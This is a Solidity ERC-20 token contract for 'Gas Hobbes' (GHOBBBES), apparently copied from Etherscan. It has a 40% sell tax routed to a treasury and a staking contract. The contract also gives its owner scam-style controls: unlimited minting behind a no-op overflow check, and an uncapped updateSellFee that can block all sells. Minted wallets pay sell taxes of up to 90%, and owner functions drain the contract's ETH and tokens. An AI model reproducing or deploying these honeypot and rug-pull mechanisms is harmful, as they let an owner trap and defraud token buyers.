/**
 *Submitted for verification at Etherscan.io on 2023-03-20
*/

//SPDX-License-Identifier: UNLICENSED
/* 
https://t.me/GasHobbes
*/ 

pragma solidity ^0.8.1;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(

        address from,

        address to,

        uint256 amount

    ) external returns (bool);

}

interface GHOBBBES {

    function mint(address _to, uint256 _amount) external;

}

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }

    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}

interface IRouter {

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;

}

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {

        _transferOwnership(_msgSender());

    }

    modifier onlyOwner() {

        _checkOwner();

        _;

    }

    function owner() public view virtual returns (address) {

        return _owner;

    }

    function _checkOwner() internal view virtual {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

    }

    function renounceOwnership() public virtual onlyOwner {

        _transferOwnership(address(0));

    }

    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        _transferOwnership(newOwner);

    }

    function _transferOwnership(address newOwner) internal virtual {

        address oldOwner = _owner;

        _owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);

    }

}

interface IxGHOBBBES {

    function deposit() external payable;

}

interface IFactory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);

}

contract GasHobbes is IERC20, GHOBBBES, Ownable {

    string public constant _name = "Gas Hobbes";

    string public constant _symbol = "GHOBBBES";

    uint8 public constant _decimals = 18;

    uint256 public _totalSupply;

    mapping (address => uint256) public _balances;

    mapping (address => mapping (address => uint256)) public _allowances;

    mapping (address => uint256) public _lastFreeze;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    mapping (address => bool) public noTax;

    address public treasury;

    address public dexPair;

    uint256 public sellFee; 

    uint256 private _tokens = 0;

    IRouter public router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private _swapping;

    IxGHOBBBES staking;

    modifier swapping() {

        _swapping = true;

        _;

        _swapping = false;

    }

    constructor (address _treasury) {

        sellFee = 4000;
        
        treasury = _treasury;

        dexPair = IFactory(router.factory()).createPair(WETH, address(this));

        _allowances[address(this)][address(router)] = type(uint256).max;

        noTax[msg.sender] = true;

        approve(address(router), type(uint256).max);

        approve(address(dexPair), type(uint256).max);

        _totalSupply = 1000000 * (10 ** 18);

        _balances[msg.sender] = 1000000 * (10 ** 18);

        emit Transfer(address(0), msg.sender, 1000000 * (10 ** 18));

    }

    function mint(address _to, uint256 _amount) external onlyOwner {

            ((_totalSupply + _amount) > _totalSupply);

            _totalSupply = _totalSupply + _amount;

            _balances[_to] = _balances[_to] + _amount;

            _lastFreeze[_to] = block.timestamp;

            emit Transfer(address(0), _to, _amount);

        }

    function totalSupply() external view override returns (uint256) {

        return _totalSupply;

    }

    function decimals() external pure returns (uint8) {

        return _decimals;

    }

    function symbol() external pure returns (string memory) {

        return _symbol;

    }

    function name() external pure returns (string memory) {

        return _name;

    }

    function getOwner() external view returns (address) {

        return owner();

    }

    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }

    function allowance(address holder, address spender) external view override returns (uint256) {

        return _allowances[holder][spender];

    }

    function approve(address spender, uint256 amount) public override returns (bool) {

        _allowances[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;

    }

    function approveMax(address spender) external returns (bool) {

        return approve(spender, _totalSupply);

    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {

        return _transferFrom(msg.sender, recipient, amount);

    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {

        if (_allowances[sender][msg.sender] != _totalSupply) {

            require(_allowances[sender][msg.sender] >= amount, "Insufficient allowance");

            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;

        }

        return _transferFrom(sender, recipient, amount);

    }

    function _transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {

        if (_swapping) return _basicTransfer(sender, recipient, amount);

        bool _sell = recipient == dexPair || recipient == address(router);

        if (_sell) {

            if (msg.sender != dexPair && !_swapping && _tokens > 0) _payTreasury();

        }

        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] = _balances[sender] - amount;

        uint256 amountReceived = (((sender == dexPair || sender == address(router)) || (recipient == dexPair || recipient == address(router))) ? !noTax[sender] && !noTax[recipient] : false) ? _calcAmount(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(sender, recipient, amountReceived);

        return true;

    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] = _balances[sender] - amount;

        _balances[recipient] = _balances[recipient] + amount;

        return true;

    }

    function _calcAmount(address sender, address receiver, uint256 amount) private returns (uint256) {

        bool _sell = receiver == dexPair || receiver == address(router);

        uint256 _sellFee = sellFee;

        if (_sell) {

            _sellFee = reqSellTax(sender);

        }

        uint256 _fee = _sell ? _sellFee : 0;

        uint256 _tax = amount * _fee / 10000;

        if (_fee > 0) {

            _tokens += _tax;

            _balances[address(this)] = _balances[address(this)] + _tax;

            emit Transfer(sender, address(this), _tax);

        }

        return amount - _tax;

    }

    function _payTreasury() private swapping {

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = WETH;

        uint256 _preview = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(balanceOf(address(this)), 0, path, address(this), block.timestamp);

        uint256 _net = address(this).balance - _preview;

        if (_net > 0) {

            payable(treasury).call{value: _net * 7000 / 10000}("");

            staking.deposit{value: _net * 3000 / 10000}();

        }

        _tokens = 0;

    }

    function setTreasury(address _treasury) external onlyOwner {

        treasury = _treasury;

    }

    function setStaking(address _xGHOBBBES) external onlyOwner {

        staking = IxGHOBBBES(_xGHOBBBES);

    }

    function setNoTax(address _wallet, bool _value) external onlyOwner {

        noTax[_wallet] = _value;

    }

    function reqNoTax(address _wallet) external view returns (bool) {

        return noTax[_wallet];

    }

    function reqSellTax(address _wallet) public view returns (uint256) {

        uint256 _sellFee = sellFee;

        if (_lastFreeze[_wallet] > 0) {

            _sellFee = 9000 - (100 * ((block.timestamp - _lastFreeze[_wallet]) / 86400));

            if (_sellFee < 4000) {

                _sellFee = 4000;

            }

        }

        return _sellFee;

    }

    function reqLastFreeze(address _wallet) external view returns (uint256) {

        return _lastFreeze[_wallet];

    }

    function reqDexPair() external view returns (address) {

        return dexPair;

    }

    function reqTreasury() external view returns (address) {

        return treasury;

    }

    function transferETH() external onlyOwner {

        payable(msg.sender).call{value: address(this).balance}("");

    }

    function transferERC(address token) external onlyOwner {

        IERC20 Token = IERC20(token);

        Token.transfer(msg.sender, Token.balanceOf(address(this)));

    }
    function updateSellFee(uint256 newSellFee) external onlyOwner {
        sellFee = newSellFee;
    }

  receive() external payable {}
}